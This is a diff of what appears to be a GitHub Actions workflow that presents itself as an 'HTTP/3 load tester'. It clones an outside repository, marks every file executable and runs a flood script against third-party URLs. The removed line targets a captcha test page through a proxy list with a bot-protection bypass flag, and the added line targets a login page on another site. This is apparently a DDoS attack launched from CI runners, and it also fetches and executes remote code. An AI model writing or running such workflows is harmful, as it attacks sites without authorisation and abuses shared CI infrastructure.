@@ -30,14 +30,14 @@ jobs:
       
       - name: Run HTTP/3 load tester
         run: |
-          npm i chalk@4 colors request   hpack cluster   
+          npm i chalk@4 colors request   hpack cluster   puppeteer-real-browser
           pip install requests
           git clone https://github.com/Fegp1p2/ideal-guide.git
           chmod +x *
           unzip Fc-main.zip 
           
           cd Fc-main
-          node a.js GET https://captcha3.dstatbot.win/gRvJQggs 700 4 1 proxy.txt --bfm --debug
+          node m.js  https://ogcheats.shop/login 200 3 3 3
 
           
 
